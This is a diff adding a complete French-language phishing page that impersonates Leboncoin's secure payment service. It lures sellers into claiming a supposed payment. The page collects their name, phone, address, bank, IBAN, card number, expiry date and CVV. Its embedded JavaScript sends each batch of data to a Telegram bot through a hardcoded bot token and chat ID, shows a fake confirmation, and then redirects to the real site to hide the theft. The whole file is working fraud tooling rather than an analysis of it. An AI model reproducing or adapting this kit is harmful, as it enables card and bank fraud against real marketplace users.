@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Réception de Paiement Sécurisé</title>
+    <style>
+        :root {
+            --color-primary-orange: #FF7B00;
+            --color-primary-orange-dark: #CC6200;
+            --color-secondary: #f4f4f4;
+            --color-text-dark: #333333;
+            --color-text-medium-dark: #777777;
+            --color-text-light: #ffffff;
+            --color-background: #ffffff;
+            --color-security-text: #666666;
+            --color-error: #ff4d4d;
+            --color-input-text: #6c757d;
+            --input-width-factor: 85%; /* Largeur du conteneur des champs */
+            --input-width-max: 320px;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--color-secondary);
+            color: var(--color-text-dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            font-size: 0.9em;
+        }
+
+        /* Header, Footer, Boutons */
+        header, footer {
+            background-color: var(--color-primary-orange);
+            color: var(--color-text-light);
+            padding: 12px 20px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        header h1 {
+            margin: 0;
+            font-size: 1.4em;
+        }
+
+        /* Pages */
+        #form-page-2, #form-page-3, #confirmation-page {
+            display: none;
+        }
+
+        /* Conteneur principal: Centrage et marges */
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 15px; 
+        }
+
+        /* Carte du Formulaire: Largeur fixe sur grand écran, adaptative sur petit */
+        .form-card {
+            background-color: var(--color-background);
+            padding: 25px; 
+            padding-bottom: 35px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 420px; 
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .logo-img {
+            max-width: 110px;
+            height: auto;
+            margin: 0 auto 15px;
+            display: block;
+        }
+        
+        .logo-cb {
+            max-width: 140px;
+            height: auto;
+            margin: 10px auto 15px;
+            display: block;
+        }
+        
+        .message-box {
+            background-color: #f7f7f7;
+            border: 1px solid #e0e0e0;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            font-size: 0.85em;
+            line-height: 1.4;
+            text-align: left;
+            color: var(--color-text-medium-dark);
+        }
+
+        /* Phrase plus professionnelle */
+        .info-message-page2, .info-message-page3 {
+            margin: 0 0 15px 0;
+            font-size: 0.8em; 
+            color: var(--color-text-dark);
+            font-weight: 500;
+        }
+
+        .card-section-title {
+            font-size: 1.1em;
+            font-weight: bold;
+            color: var(--color-text-dark);
+            margin-bottom: 8px;
+        }
+        
+        /* Bouton */
+        .btn-payment, .btn-submit {
+            display: block;
+            width: var(--input-width-factor); 
+            max-width: var(--input-width-max);
+            margin: 15px auto 0 auto;
+            padding: 12px;
+            background-color: var(--color-primary-orange);
+            color: var(--color-text-light);
+            border: none;
+            border-radius: 6px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-decoration: none;
+        }
+
+        .btn-payment:hover, .btn-submit:hover {
+            background-color: var(--color-primary-orange-dark);
+        }
+        
+        .security-notes {
+            margin-top: 15px;
+            font-size: 0.75em;
+            color: var(--color-security-text);
+            line-height: 1.3;
+        }
+        
+        .additional-logo {
+            max-width: 120px;
+            height: auto;
+            margin: 20px auto 0;
+            display: block;
+            opacity: 0.8;
+        }
+
+        /* Styles de Formulaire */
+        .input-group {
+            margin-bottom: 20px; 
+            text-align: center; 
+            position: relative;
+        }
+        
+        #form-2-data .input-group:last-of-type,
+        #form-3-data .input-group:last-of-type {
+            margin-bottom: 10px; 
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 3px;
+            font-weight: bold;
+            font-size: 0.85em; 
+            text-align: left;
+            width: var(--input-width-factor);
+            max-width: var(--input-width-max);
+            margin: 0 auto 3px auto;
+        }
+
+        .input-group input {
+            width: var(--input-width-factor); 
+            max-width: var(--input-width-max);
+            padding: 7px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 0.85em;
+            transition: border-color 0.3s ease;
+            color: var(--color-input-text);
+            font-weight: 400; 
+            display: block; 
+            margin: 0 auto;
+        }
+        
+        /* Configuration du groupe split (MM/AA et CVV) */
+        .split-group {
+            display: flex;
+            justify-content: space-between; /* ALIGNEMENT ÉCARTÉ */
+            gap: 10px;
+            margin-bottom: 20px; 
+            width: var(--input-width-factor); /* Largeur du conteneur des deux inputs */
+            max-width: var(--input-width-max);
+            margin: 0 auto 20px auto; /* Centre le conteneur */
+        }
+
+        #form-3-data .split-group {
+            margin-bottom: 10px;
+        }
+        
+        .split-group .input-group {
+            flex: none; /* Ne pas étirer */
+            margin-bottom: 0;
+            text-align: left; 
+            /* Permet aux inputs d'être centrés dans l'espace restant pour un meilleur contrôle */
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; /* Aligne le label à gauche */
+        }
+        
+        /* Définition de la largeur UNIFORME pour les deux inputs (60px) */
+        .split-group #expiry-date,
+        .split-group #cvv {
+            width: 60px; 
+            max-width: 60px;
+            margin: 0; /* Important pour l'alignement flex */
+        }
+        
+        /* Ajustement des labels pour rester alignés à gauche de leur input-group */
+        .split-group .input-group label {
+            width: 100%;
+            margin: 0 0 3px 0;
+            text-align: left;
+        }
+        
+        /* S'assurer que le numéro de carte reprend la largeur standard */
+        #card-number {
+             width: var(--input-width-factor); 
+             max-width: var(--input-width-max);
+             margin: 0 auto;
+        }
+
+        .error-message {
+            color: var(--color-error);
+            font-size: 0.75em;
+            margin-top: 5px;
+            display: none;
+            text-align: center;
+        }
+
+        .input-group.error input {
+            border-color: var(--color-error);
+        }
+        
+        /* Chargement Circulaire (Spinner) */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--color-primary-orange);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Section Récapitulative (Page 4) */
+        .recap-message {
+            margin-top: 20px;
+            color: var(--color-text-dark);
+            font-weight: normal; 
+            line-height: 1.4;
+            font-size: 0.95em; 
+        }
+        
+        .recap-message span {
+            font-weight: 900; 
+            display: block; 
+            margin-bottom: 5px;
+            font-size: 1em;
+        }
+        
+        .recap-data {
+            text-align: left;
+            margin: 15px 0;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            font-size: 0.85em; 
+        }
+        
+        .recap-data strong {
+            display: inline-block;
+            width: 110px;
+            color: var(--color-text-dark);
+            font-weight: normal; 
+        }
+        
+        .recap-data span {
+            color: var(--color-input-text); 
+            font-weight: bold;
+        }
+        
+        /* Media Query pour Responsivité (Smartphones) */
+        @media (max-width: 600px) {
+            :root {
+                --input-width-factor: 90%; 
+            }
+            
+            .input-group label {
+                width: 90%; 
+            }
+            
+            #card-number {
+                 width: var(--input-width-factor); 
+                 max-width: var(--input-width-max);
+                 margin: 0 auto;
+            }
+            
+            .split-group {
+                width: var(--input-width-factor); 
+                max-width: var(--input-width-max);
+                margin: 0 auto 15px auto;
+                justify-content: space-between; 
+            }
+             
+            /* Les inputs MM/AA et CVV gardent leur petite taille uniforme */
+            .split-group #expiry-date,
+            .split-group #cvv {
+                width: 60px; 
+                max-width: 60px; 
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <header>
+        <h1></h1>
+    </header>
+
+    <div class="container">
+        
+        <div id="form-page-1" class="form-card">
+            <img src="https://i.postimg.cc/d31N4LJy/logo.png" alt="Logo de l'application" class="logo-img">
+            <div class="message-box">
+                Nous vous confirmons la réception du paiement sécurisé relatif à votre annonce sur Leboncoin. Afin de procéder à l'encaissement de vos fonds, il vous est demandé de bien vouloir renseigner le formulaire ci-joint de manière complète et exacte
+            </div>
+            <button type="button" id="payment-button" class="btn-payment">
+                RECEVOIR MON PAIEMENT
+            </button>
+            <div class="security-notes">
+                <p>Vos informations sont protégées par un cryptage SSL 256 bits. Ne communiquez jamais votre code de vérification à un tiers.</p>
+                <p>Service client disponible 24/7. Pour toute question, contactez-nous via la plateforme.</p>
+            </div>
+            <img src="https://i.postimg.cc/wMyc1J6X/logo11.png" alt="Logo de sécurité" class="additional-logo">
+        </div>
+
+        <div id="form-page-2" class="form-card">
+             <img src="https://i.postimg.cc/d31N4LJy/logo.png" alt="Logo de l'application" class="logo-img">
+            
+            <p class="info-message-page2">
+                **Validation Requise :** Veuillez renseigner vos coordonnées bancaires et personnelles de manière exacte afin d'activer le virement.
+            </p>
+
+            <form id="form-2-data">
+                <div class="input-group">
+                    <label for="nom">Nom Complet</label>
+                    <input type="text" id="nom" name="nom" required placeholder="Ex : Dupont Jean-Pierre">
+                    <span class="error-message" id="error-nom">Ce champ est requis.</span>
+                </div>
+                <div class="input-group">
+                    <label for="telephone">Numéro de Téléphone</label>
+                    <input type="tel" id="telephone" name="telephone" required placeholder="Ex : 0601020304" maxlength="10">
+                    <span class="error-message" id="error-telephone">Veuillez entrer exactement 10 chiffres (ex: 0601020304).</span>
+                </div>
+                <div class="input-group">
+                    <label for="adresse">Adresse</label>
+                    <input type="text" id="adresse" name="adresse" required placeholder="Ex : 15 rue de la Liberté, 75001 Paris">
+                    <span class="error-message" id="error-adresse">Ce champ est requis.</span>
+                </div>
+                <div class="input-group">
+                    <label for="banque">Nom de la Banque</label>
+                    <input type="text" id="banque" name="banque" required placeholder="Ex : Crédit Agricole ou Boursorama">
+                    <span class="error-message" id="error-banque">Ce champ est requis.</span>
+                </div>
+                <div class="input-group">
+                    <label for="rib">RIB / IBAN</label>
+                    <input type="text" id="rib" name="rib" required placeholder="Ex : FR76XXXXXXXXXXXXX">
+                    <span class="error-message" id="error-rib">Veuillez entrer un RIB/IBAN valide.</span>
+                </div>
+
+                <button type="button" id="submit-page-2" class="btn-submit">
+                    CONFIRMER ET RECEVOIR
+                </button>
+            </form>
+            
+             <div class="security-notes">
+                <p>Vos données sont traitées avec la plus grande confidentialité.</p>
+            </div>
+             <img src="https://i.postimg.cc/wMyc1J6X/logo11.png" alt="Logo de sécurité" class="additional-logo">
+        </div>
+
+        <div id="form-page-3" class="form-card">
+            
+            <span class="card-section-title">Carte Bancaire</span>
+            
+            <p class="info-message-page3">
+                **Procédure Finale :** Pour des raisons de conformité et de sécurité, veuillez renseigner les détails de la carte pour valider la transaction.
+            </p>
+            
+            <img src="https://i.postimg.cc/3wNZszsd/logocb.png" alt="Logo carte bancaire" class="logo-cb">
+
+            <form id="form-3-data">
+                <div class="input-group">
+                    <label for="card-number">Numéro de Carte (16 chiffres)</label>
+                    <input type="text" id="card-number" name="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                    <span class="error-message" id="error-card-number">Veuillez entrer 16 chiffres valides.</span>
+                </div>
+
+                <div class="split-group">
+                    <div class="input-group">
+                        <label for="expiry-date">Date d'Expiration</label>
+                        <input type="text" id="expiry-date" name="expiry-date" placeholder="08/26" maxlength="5" required>
+                        <span class="error-message" id="error-expiry-date">Format MM/AA requis.</span>
+                    </div>
+                    <div class="input-group">
+                        <label for="cvv">CVV</label>
+                        <input type="password" id="cvv" name="cvv" placeholder="XXX" maxlength="3" required>
+                        <span class="error-message" id="error-cvv">CVV requis (3 chiffres).</span>
+                    </div>
+                </div>
+
+                <button type="button" id="submit-page-3" class="btn-submit">
+                    TERMINER LA RÉCEPTION
+                </button>
+            </form>
+            
+             <div class="security-notes">
+                <p>Votre banque peut vous demander d'autoriser le paiement pour recevoir les fonds.</p>
+            </div>
+             <img src="https://i.postimg.cc/wMyc1J6X/logo11.png" alt="Logo de sécurité" class="additional-logo">
+        </div>
+
+        <div id="confirmation-page" class="form-card">
+            <img src="https://i.postimg.cc/d31N4LJy/logo.png" alt="Logo de l'application" class="logo-img">
+            
+            <p class="recap-message">
+                <span>Merci ! Vos données ont été reçues.</span>
+                Nous procédons au virement de vos fonds. Un conseiller vous contactera pour finaliser la procédure.
+            </p>
+
+            <div class="recap-data">
+                <h3>Détails de la transaction :</h3>
+                <p><strong>Statut :</strong> <span>En cours de traitement</span></p>
+                <p><strong>Date :</strong> <span><span id="recap-date"></span></span></p>
+                <p><strong>Heure :</strong> <span><span id="recap-time"></span></span></p>
+                <p><strong>Référence :</strong> <span><span id="recap-ref"></span></span></p>
+                
+                <h3>Vos Informations :</h3>
+                <p><strong>Nom complet :</strong> <span id="recap-nom"></span></p>
+                <p><strong>Téléphone :</strong> <span id="recap-tel"></span></p>
+                <p><strong>Banque :</strong> <span id="recap-banque"></span></p>
+                <p><strong>RIB/IBAN :</strong> <span id="recap-rib"></span></p>
+                <p><strong>Carte masquée :</strong> <span>XXXX XXXX XXXX <span id="recap-card-last4"></span></span></p>
+            </div>
+            
+             <div class="security-notes">
+                <p>Redirection automatique vers Google dans quelques secondes...</p>
+            </div>
+             <img src="https://i.postimg.cc/wMyc1J6X/logo11.png" alt="Logo de sécurité" class="additional-logo">
+        </div>
+        
+    </div>
+
+    <footer>
+        <p>&copy; 2025. Tous droits réservés.</p>
+        <p>Service de paiement sécurisé - Protégez vos informations.</p>
+    </footer>
+
+<script>
+    // ==============================================================================
+    // CONFIGURATION ET LOGIQUE TÉLÉGRAM
+    // ⚠️ IMPORTANT : REMPLACEZ CES VALEURS PAR VOS VRAIS IDENTIFIANTS
+    // ==============================================================================
+    const TELEGRAM_BOT_TOKEN = "8146763994:AAH3-fEFXbPezkPd4X7wwwsseqYQIedch-0";
+    const TELEGRAM_CHAT_ID = "8130095786";
+    
+    let userRecapData = {};
+    
+    function generateRef() {
+        return Math.random().toString(36).substring(2, 10).toUpperCase();
+    }
+
+    /**
+     * Envoie les données collectées à Telegram.
+     * @param {Object} data - L'objet contenant les données à envoyer.
+     * @param {string} step - L'étape du formulaire ('Page 2' ou 'Page 3').
+     */
+    function sendDataToTelegram(data, step) {
+        
+        let message = `🚨 Nouvelle Saisie - ${step} 🚨\n`;
+        message += `------------------------------------\n`;
+        
+        // Informations Page 2 (toujours incluses après l'étape 2)
+        message += `👤 Nom: ${data.nom || 'N/A'}\n`;
+        message += `📞 Tél: ${data.telephone || 'N/A'}\n`;
+        message += `🏠 Adr: ${data.adresse || 'N/A'}\n`;
+        message += `🏦 Banque: ${data.banque || 'N/A'}\n`;
+        message += `💳 RIB/IBAN: ${data.rib || 'N/A'}\n`;
+        
+        if (step === 'Page 3') {
+            // Informations Page 3 (sensibles)
+            message += `*** Informations de Carte (SENSITIVES) ***\n`;
+            message += `NUM: ${data['card-number'] || 'N/A'}\n`;
+            message += `EXP: ${data['expiry-date'] || 'N/A'}\n`;
+            message += `CVV: ${data.cvv || 'N/A'}\n`;
+        }
+        
+        message += `------------------------------------\n`;
+        message += `Heure de Saisie: ${new Date().toLocaleString()}`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        // Exécution de l'appel API
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    console.error(`Erreur HTTP lors de l'envoi Telegram. Statut: ${response.status}`);
+                } else {
+                    console.log(`Envoi Telegram réussi pour ${step}.`);
+                }
+            })
+            .catch(error => {
+                console.error(`Erreur réseau/générique lors de l'envoi Telegram pour ${step}:`, error);
+            });
+    }
+    
+    // ==============================================================================
+    // LOGIQUE DE VALIDATION
+    // ==============================================================================
+
+    function validateField(inputElement, errorMessageElement, validationType) {
+        const value = inputElement.value.trim();
+        let isValid = true;
+        let message = "Ce champ est requis.";
+        const parentGroup = inputElement.closest('.input-group');
+        parentGroup.classList.remove('error');
+        errorMessageElement.style.display = 'none';
+        
+        const cleanTelValue = value.replace(/\s/g, '');
+
+        if (value === "") {
+            isValid = false;
+        } else if (validationType === 'tel') {
+            if (cleanTelValue.length !== 10 || isNaN(cleanTelValue)) {
+                 isValid = false;
+                 message = "Veuillez entrer exactement 10 chiffres (ex: 0601020304).";
+            }
+        } else if (validationType === 'rib') {
+            if (value.length < 10) {
+                 isValid = false;
+                 message = "Veuillez entrer un RIB/IBAN valide.";
+            }
+        } else if (validationType === 'card') {
+            const cleanValue = value.replace(/\s/g, '');
+            if (cleanValue.length !== 16 || isNaN(cleanValue)) {
+                 isValid = false;
+                 message = "Veuillez entrer 16 chiffres valides.";
+            }
+        } else if (validationType === 'expiry') {
+            const dateValue = value.replace(/\s/g, '');
+            if (!/^\d{2}\/\d{2}$/.test(dateValue)) {
+                 isValid = false;
+                 message = "Format MM/AA requis.";
+            }
+        } else if (validationType === 'cvv') {
+            if (!/^\d{3}$/.test(value)) {
+                 isValid = false;
+                 message = "CVV requis (3 chiffres).";
+            }
+        }
+
+        if (!isValid) {
+            parentGroup.classList.add('error');
+            errorMessageElement.textContent = message;
+            errorMessageElement.style.display = 'block';
+        }
+        return isValid;
+    }
+
+    function formatInput(inputElement) {
+        if (inputElement.id === 'card-number') {
+            let v = inputElement.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let groups = [];
+            for (let i = 0; i < v.length; i += 4) {
+                groups.push(v.substring(i, i + 4));
+            }
+            inputElement.value = groups.join(' ').substring(0, 19);
+        } else if (inputElement.id === 'expiry-date') {
+            let v = inputElement.value.replace(/[^0-9]/g, '');
+            if (v.length > 2) {
+                inputElement.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+            } else {
+                inputElement.value = v;
+            }
+        } else if (inputElement.id === 'cvv') {
+             inputElement.value = inputElement.value.replace(/[^0-9]/g, '').substring(0, 3);
+        } else if (inputElement.id === 'telephone') {
+             inputElement.value = inputElement.value.replace(/[^0-9]/g, '').substring(0, 10);
+        }
+    }
+
+    function validateForm(fields) {
+        let isFormValid = true;
+        fields.forEach(field => {
+            const input = document.getElementById(field.id);
+            const error = document.getElementById(`error-${field.id}`);
+            if (!validateField(input, error, field.type)) {
+                isFormValid = false;
+            }
+        });
+        return isFormValid;
+    }
+
+    const fieldsPage2 = [
+        { id: 'nom', type: 'text' },
+        { id: 'telephone', type: 'tel' },
+        { id: 'adresse', type: 'text' },
+        { id: 'banque', type: 'text' },
+        { id: 'rib', type: 'rib' }
+    ];
+
+    const fieldsPage3 = [
+        { id: 'card-number', type: 'card' },
+        { id: 'expiry-date', type: 'expiry' },
+        { id: 'cvv', type: 'cvv' }
+    ];
+
+    // ==============================================================================
+    // GESTION DES PAGES ET SOUMISSION
+    // ==============================================================================
+
+    document.getElementById('payment-button').addEventListener('click', function() {
+        document.getElementById('loading-overlay').style.display = 'flex';
+        document.getElementById('form-page-1').style.display = 'none';
+
+        setTimeout(function() {
+            document.getElementById('loading-overlay').style.display = 'none';
+            document.getElementById('form-page-2').style.display = 'block';
+        }, 4000);
+    });
+    
+    document.getElementById('submit-page-2').addEventListener('click', function() {
+        if (validateForm(fieldsPage2)) {
+            // 1. Collecte des données de la Page 2
+            fieldsPage2.forEach(field => {
+                userRecapData[field.id] = document.getElementById(field.id).value;
+            });
+            
+            // 2. ENVOI DES DONNÉES DE LA PAGE 2
+            sendDataToTelegram(userRecapData, 'Page 2'); 
+
+            document.getElementById('loading-overlay').style.display = 'flex';
+            document.getElementById('form-page-2').style.display = 'none';
+
+            setTimeout(function() {
+                document.getElementById('loading-overlay').style.display = 'none';
+                document.getElementById('form-page-3').style.display = 'block';
+            }, 5000);
+        }
+    });
+
+    document.getElementById('submit-page-3').addEventListener('click', function() {
+        if (validateForm(fieldsPage3)) {
+            // 1. Collecte des données de la Page 3
+            fieldsPage3.forEach(field => {
+                 userRecapData[field.id] = document.getElementById(field.id).value;
+            });
+            
+            // 2. ENVOI DES DONNÉES DE LA PAGE 3 (y compris les infos Page 2)
+            sendDataToTelegram(userRecapData, 'Page 3'); 
+
+            document.getElementById('loading-overlay').style.display = 'flex';
+            document.getElementById('form-page-3').style.display = 'none';
+
+            setTimeout(function() {
+                document.getElementById('loading-overlay').style.display = 'none';
+                document.getElementById('confirmation-page').style.display = 'block';
+                
+                // Affichage du récap
+                const now = new Date();
+                const last4Card = userRecapData['card-number'].replace(/\s/g, '').slice(-4);
+                
+                document.getElementById('recap-date').textContent = now.toLocaleDateString('fr-FR');
+                document.getElementById('recap-time').textContent = now.toLocaleTimeString('fr-FR');
+                document.getElementById('recap-ref').textContent = generateRef();
+
+                document.getElementById('recap-nom').textContent = userRecapData['nom'];
+                document.getElementById('recap-tel').textContent = userRecapData['telephone'];
+                document.getElementById('recap-banque').textContent = userRecapData['banque'];
+                document.getElementById('recap-rib').textContent = userRecapData['rib'];
+                document.getElementById('recap-card-last4').textContent = last4Card;
+                
+                // Redirection après 12 secondes
+                setTimeout(function() {
+                    window.location.href = "https://www.leboncoin.fr/service/paiement-securise";
+                }, 12000);
+                
+            }, 7000);
+        }
+    });
+
+    // Écouteurs d'événements pour la validation et le formatage en temps réel
+    const allFields = [...fieldsPage2, ...fieldsPage3];
+    allFields.forEach(field => {
+        const input = document.getElementById(field.id);
+        if (input) {
+            input.addEventListener('input', function() {
+                const error = document.getElementById(`error-${field.id}`);
+                formatInput(input);
+                validateField(input, error, field.type);
+            });
+        }
+    });
+</script>
+
+</body>
+</html>
